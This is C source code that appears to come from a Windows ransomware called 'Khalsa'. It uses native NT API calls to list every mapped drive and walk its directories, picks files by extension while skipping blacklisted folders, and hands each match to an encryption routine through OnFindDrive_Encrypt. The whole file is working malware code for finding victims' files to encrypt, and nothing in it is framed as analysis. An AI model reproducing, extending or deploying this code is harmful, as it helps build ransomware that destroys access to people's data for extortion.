
#include "khalsa_rec.h"
#include "khalsa_crypt.h"
#include "khalsa_clib.h"
LPWSTR MyPathFindExtensionW(LPCWSTR lpszPath)
{
    LPCWSTR lastpoint = NULL;

    if (lpszPath)
    {
        while (*lpszPath)
        {
            if (*lpszPath == '\\' || *lpszPath == ' ')
                lastpoint = NULL;
            else if (*lpszPath == '.')
                lastpoint = lpszPath;
            lpszPath++;
        }
    }
    return (LPWSTR)(lastpoint ? lastpoint : lpszPath);
}

enum SearchParameters {
    LimitSearchToFiles,
    LimitSearchToDirectory

};
enum ReturnDirValues {
    ReturnSuccess,
    ReturnFailDir,
    ReturnNoMoreFiles
};

#define FIND_DATA_SIZE      0x4000
typedef struct _FILE_SYS_ENTRY {
    LPWSTR lpszFileName;
    DWORD dwFileSize;
    DWORD FileNameLength;
} FILE_SYS_ENTRY, * PFILE_SYS_ENTRY;

PVOID Buffer[FIND_DATA_SIZE];
NTSTATUS GetDirectoryContents(PHANDLE hDirectory, LPWSTR lpszDir, enum SearchParameters sParams, PFILE_SYS_ENTRY pFileSysEntry, PBOOL pbOpenDir) {
    BOOL rv = FALSE;

    HANDLE hFile = INVALID_HANDLE_VALUE;
    IO_STATUS_BLOCK IoStatusBlock;
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    BOOL bFirstCall = FALSE;

    if (*pbOpenDir) {
        UNICODE_STRING NtPath;
        OBJECT_ATTRIBUTES ObjectAttributes;
        _RtlDosPathNameToRelativeNtPathName_U(lpszDir, &NtPath, NULL, NULL);
        InitializeObjectAttributes(&ObjectAttributes, &NtPath, OBJ_CASE_INSENSITIVE, 0, 0);

        status = _NtOpenFile(hDirectory, FILE_LIST_DIRECTORY | SYNCHRONIZE, &ObjectAttributes, &IoStatusBlock, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT);
        hFile = *hDirectory;
        if (!NT_SUCCESS(status) || (hFile == INVALID_HANDLE_VALUE)) {

            *pbOpenDir = FALSE;
            _HeapFree(_GetProcessHeap(), 0, NtPath.Buffer);

            return STATUS_ACCESS_DENIED;
        }
        bFirstCall = TRUE;
        *hDirectory = hFile;
        *pbOpenDir = FALSE;

        _HeapFree(_GetProcessHeap(), 0, NtPath.Buffer);
    }
    else {
        hFile = *hDirectory;
        bFirstCall = FALSE;

    }

    BOOL bFoundEntry = FALSE;

    do {
        ZeroBuffer(Buffer, FIND_DATA_SIZE);
        status = _NtQueryDirectoryFile(hFile, NULL, NULL, NULL, &IoStatusBlock, Buffer, FIND_DATA_SIZE, FileBothDirectoryInformation, TRUE, NULL, bFirstCall);

        bFirstCall = FALSE;
        if (status == STATUS_NO_MORE_FILES)
            break;

        if (NT_SUCCESS(status)) {
            PFILE_BOTH_DIR_INFORMATION pFileDirInfo = (PFILE_BOTH_DIR_INFORMATION)Buffer;
            BOOL bMatch = FALSE;
            switch (sParams)
            {
            case LimitSearchToFiles:
                if (!(pFileDirInfo->FileAttributes & FILE_ATTRIBUTE_DIRECTORY))
                    bMatch = TRUE;
                break;
            case LimitSearchToDirectory:
                if (!(pFileDirInfo->FileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0 || (pFileDirInfo->FileAttributes & FILE_ATTRIBUTE_REPARSE_POINT)) {
                    if ((pFileDirInfo->FileNameLength == 2) || (pFileDirInfo->FileNameLength == 4)) {
                        if (_memcmp(pFileDirInfo->FileName, L".", 2) == 0 || _memcmp(pFileDirInfo->FileName, L"..", 4) == 0) {
                            bMatch = FALSE;
                            break;
                        }
                    }
                    bMatch = TRUE;
                }
                break;
            }
            if (!bMatch)
                continue;

            if ((pFileDirInfo->NextEntryOffset != 0) || (pFileDirInfo->FileNameLength == 0)) {
                break;

            }
            pFileSysEntry->lpszFileName = _HeapAlloc(_GetProcessHeap(), 0, (pFileDirInfo->FileNameLength + 1) * sizeof(WCHAR));
            pFileSysEntry->FileNameLength = pFileDirInfo->FileNameLength;
            ZeroBuffer(pFileSysEntry->lpszFileName, (pFileDirInfo->FileNameLength + 1) * sizeof(WCHAR));
            
            _memcpy(pFileSysEntry->lpszFileName, pFileDirInfo->FileName, pFileDirInfo->FileNameLength * sizeof(WCHAR));
            
            bFoundEntry = TRUE;            
        }
    } while (!bFoundEntry);

    //HeapFree(_GetProcessHeap(), 0, Buffer);
    rv = ((status == STATUS_NO_MORE_FILES) || (NT_SUCCESS(status)));
    return status;
}
BOOL ScanFolder(LPWSTR lpszDir, LPVOID lpParam, BOOL(*pfOnFindFile)(LPWSTR))
{

    PKHALSA_SCAN_CONFIG pkhsContext = (PKHALSA_SCAN_CONFIG)lpParam;
    LPWSTR* lpszExts = pkhsContext->lpszExts;
    LPWSTR* lpszBlacklist = pkhsContext->lpszBlacklist;

    WCHAR lpszDirectoryFileName[MAX_PATH * 2];
    WCHAR lpszDirectoryBlackList[MAX_PATH * 2];



    struct stack {
        wchar_t* path;
        size_t pathlen;
        HANDLE hDirectory;
        BOOL bFirstCall;
        BOOL bFirstCallDir;
        struct stack* next;
        FILE_SYS_ENTRY FileSysEntry;
        BOOL RootFolder;
        
    } *dir, dir0, *ndir;

    LPWSTR lpszBuf = NULL;
    dir0.path = lpszDir;
    dir0.pathlen = _wcslen(lpszDir);
    dir0.next = NULL;
    dir0.hDirectory = INVALID_HANDLE_VALUE;
    dir0.bFirstCall = TRUE;
    dir0.bFirstCallDir = TRUE;
    dir0.RootFolder = TRUE;
    dir = &dir0;
loop:
    while (dir) {
        NTSTATUS status = STATUS_UNSUCCESSFUL;
        do{
            status = GetDirectoryContents(&dir->hDirectory, dir->path, LimitSearchToFiles, &dir->FileSysEntry, &dir->bFirstCall);
            if (NT_SUCCESS(status) ) {
                if (dir->FileSysEntry.lpszFileName == NULL)
                    break;

                LPWSTR lpszExt = MyPathFindExtensionW(dir->FileSysEntry.lpszFileName);
                
                DWORD dwIndex = 0;
                while (lpszExts[dwIndex] != NULL)
                {
                    if (!__CmpStrW(lpszExt, lpszExts[dwIndex]))
                    {
                        /*
                        
                                                DWORD dwPathLen = dir->pathlen * sizeof(WCHAR);
                        ZeroBuffer(lpszDirectoryFileName, MAX_PATH*2);
                        _memcpy(lpszDirectoryFileName, dir->path, dwPathLen);
                        _memcpy((void*)(lpszDirectoryFileName + dwPathLen), L"\\", _wcslen(L"\\")*sizeof(WCHAR));
                        _memcpy((void*)(lpszDirectoryFileName + dwSlash + dwPathLen), dir->FileSysEntry.lpszFileName, dir->FileSysEntry.FileNameLength *sizeof(WCHAR));
//                        dir->FileSysEntry.lpszFileName);
                        wprintf(L"%s %d\n", lpszDirectoryFileName, dir->FileSysEntry.FileNameLength);
                        
                        */
                        ZeroBuffer(lpszDirectoryFileName, MAX_PATH*2);
                        _wsprintfW(lpszDirectoryFileName, L"%s\\%s", dir->path, dir->FileSysEntry.lpszFileName);
                        //wprintf(L"%s %d\n", lpszDirectoryFileName, dir->FileSysEntry.FileNameLength);
                       
                        //_MessageBoxW(NULL, lpszDirectoryFileName, L"FOUND A FILE", 0);
                        (*pfOnFindFile)(lpszDirectoryFileName);
                    }
                    dwIndex++;
                }
                _HeapFree(_GetProcessHeap(), 0, dir->FileSysEntry.lpszFileName);

                ZeroBuffer(&dir->FileSysEntry, sizeof(FILE_SYS_ENTRY));
            }
            else
                break;
            
        } while ((status != STATUS_NO_MORE_FILES));
 
        
        if (status == STATUS_ACCESS_DENIED) {
            goto popdir;
        }


    subdirs:
        /* Enter subdirectories. */
        do{

            status = GetDirectoryContents(&dir->hDirectory, dir->path, LimitSearchToDirectory, &dir->FileSysEntry, &dir->bFirstCallDir);


            if (status == STATUS_ACCESS_DENIED) {
                break;
            }
            if (!NT_SUCCESS(status))
                continue;
            

            LPWSTR lpszFileName = dir->FileSysEntry.lpszFileName;
            if (lpszFileName == NULL)
                break;
            size_t buflen, fnlen;
            DWORD dwIndex = 0;
            
            while (lpszBlacklist[dwIndex] != NULL)
            {
                
                ZeroBuffer(lpszDirectoryBlackList, MAX_PATH * 2);
                ZeroBuffer(lpszDirectoryFileName, MAX_PATH*2);
                _wsprintfW(lpszDirectoryFileName, L"%s:\\%s", dir->path, lpszFileName);
                _wsprintfW(lpszDirectoryBlackList, L"%s:\\%s", dir0.path, lpszBlacklist[dwIndex]);

                if (!__CmpStrW(lpszDirectoryFileName, lpszDirectoryBlackList)){
                    if(lpszFileName)
                        _HeapFree(_GetProcessHeap(), 0, lpszFileName);
                    
                    goto subdirs;
                }
                
                dwIndex++;
                
            }
             

            ndir = _HeapAlloc(_GetProcessHeap(), 0, sizeof * ndir);
            if (!ndir) {
                if(lpszFileName)
                    _HeapFree(_GetProcessHeap(), 0, lpszFileName);
                
                
                break;
            }


            fnlen = dir->FileSysEntry.FileNameLength;

            WCHAR lpszSlash[] = L"\\";
            DWORD dwSlash = _wcslen(lpszSlash);
            DWORD dwPath = _wcslen(dir->path);
            if((dir->RootFolder == TRUE))
                buflen = dwPath + fnlen + 1;
            else
                buflen = dwPath + dwSlash + fnlen + 1;

            lpszBuf = _HeapAlloc(_GetProcessHeap(), 0, buflen * (sizeof(WCHAR)));
            if (!lpszBuf) {
                if(ndir)
                    _HeapFree(_GetProcessHeap(), 0, ndir);
                if(lpszFileName)
                    _HeapFree(_GetProcessHeap(), 0, lpszFileName);
                
                break;
                
            }

            ZeroBuffer(lpszBuf, buflen * sizeof(WCHAR));
            _memcpy(lpszBuf, dir->path, dwPath * sizeof(wchar_t));

            if ((dir->RootFolder == TRUE)) {

                _memcpy(lpszBuf + dwPath, lpszFileName, fnlen * sizeof(wchar_t));
            }
            else {
                _memcpy(lpszBuf + dwPath, L"\\", dwSlash * sizeof(wchar_t));

                _memcpy(lpszBuf + dwPath + dwSlash, lpszFileName, fnlen * sizeof(wchar_t));

            }
            ndir->path = lpszBuf;
            ndir->pathlen = dwPath + dwSlash + fnlen;
            ndir->hDirectory = INVALID_HANDLE_VALUE;
            ndir->bFirstCall = TRUE;
            ndir->bFirstCallDir = TRUE;
            ndir->RootFolder = FALSE;
            ndir->next = dir;
            dir = ndir;
            if(lpszFileName)
                _HeapFree(_GetProcessHeap(), 0, lpszFileName);
            
            goto loop;
            

        
        } while ((status != STATUS_NO_MORE_FILES));




    popdir:
        if ((status == STATUS_NO_MORE_FILES) && (dir->RootFolder == TRUE)) {
            break;
        }
        
        if(dir->path)
            _HeapFree(_GetProcessHeap(), 0, dir->path);
        
        if (dir->hDirectory != INVALID_HANDLE_VALUE)
            _NtClose(dir->hDirectory);
       

        if (ndir = dir->next)
            _HeapFree(_GetProcessHeap(), 0, dir);

        dir = ndir;

            goto subdirs;
    }










    return TRUE;
}


WCHAR lpszVolumeName[KHALSA_MAX_DRIVE_LENGTH];
BOOL ScanDrives(BOOL(*pfOnFindDrive)(LPWSTR, LPVOID), LPVOID lpParam)
{
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
    PROCESS_DEVICEMAP_INFORMATION ProcessDeviceMapInfo;
    WCHAR lpszVolumeNameBuff[] = L"?:\\";
    LPWSTR lpszVolumeNameTemp = lpszVolumeName;
    LPWSTR p;
    DWORD drive = 0, count = 0;
    BOOL rv = FALSE;
    /* Get the Device Map for this Process */
    Status = _NtQueryInformationProcess(NtCurrentProcess(), ProcessDeviceMap, &ProcessDeviceMapInfo.Query, sizeof(ProcessDeviceMapInfo.Query), NULL);
    if (!NT_SUCCESS(Status)|| (ProcessDeviceMapInfo.Query.DriveMap == 0)) {
        return rv;
    }

    DWORD dwDriveMap = ProcessDeviceMapInfo.Query.DriveMap;
    for (drive = count = 0; drive < MAX_DOS_DRIVES; drive++)
    {
        if (dwDriveMap & (1 << drive))
            count++;
    }

    if ((count * 4) + 1 > KHALSA_MAX_DRIVE_LENGTH) {
        return rv;
    }
    p = lpszVolumeName;
    for (drive = 0; drive < MAX_DOS_DRIVES; drive++)
        if (dwDriveMap & (1 << drive))
        {
            *p++ = (WCHAR)('A' + drive);
            *p++ = (WCHAR)':';
            *p++ = (WCHAR)'\\';
            *p++ = (WCHAR)'\0';
        }
    *p = (WCHAR)'\0';

    while (*lpszVolumeNameTemp) {
        lpszVolumeNameBuff[0] = lpszVolumeNameTemp[0];
        return rv = (*pfOnFindDrive)(lpszVolumeNameTemp, lpParam);
        lpszVolumeNameTemp += _wcslen(lpszVolumeNameTemp) + 1;
        
    }
    return rv;
}
BOOL OnFindDrive_Encrypt(LPWSTR lpszDriveName, LPVOID lpParam)
{

    return ScanFolder(lpszDriveName, lpParam, KhalsaEncryptCryptoFunc);
}




